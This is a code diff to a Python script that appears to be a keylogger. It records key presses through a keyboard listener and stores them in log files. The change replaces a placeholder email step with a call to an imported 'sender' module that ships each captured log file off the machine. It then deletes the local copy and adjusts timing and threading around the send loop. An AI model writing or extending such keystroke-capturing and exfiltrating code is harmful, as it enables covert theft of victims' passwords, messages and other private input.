@@ -5,6 +5,8 @@ import requests
 import socket
 import time
 import os
+import sender
+import threading
 """
 MIT License
 
@@ -158,26 +160,30 @@ def send_logs():
     count = 0
     MIN = 10
     SECS = 60
-    # time.sleep(MIN * SECONDS) # Sends email every 10min
-    time.sleep(30)  # Ever 30s for debugging
+    # time.sleep(MIN * SECONDS) # Sends email every 10min  # Ever 30s for debugging
+    time.sleep(5)
     while True:
         if len(log_data) > 1:
             try:
-                # SEND EMAIL HERE - F*** YOU GOOGLE!
-                write_file()
+                print(d_file[0])
+                sender.send_file(d_file[0])
                 os.remove(d_file[0])
                 del log_data[1:]
                 del d_file[0:]
                 print('Deleted data/files')  # DEBUG MODE ONLY
 
                 count += 1
+                break
 
             except Exception as errorString:
                 print('[!] logs // Error.. ~ %s' % errorString)
-                pass
+                break
 
 
 # Start Listener
 if __name__ == '__main__':
+    #T1 = threading.Thread(target=send_logs)
+    #T1.start()
+
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
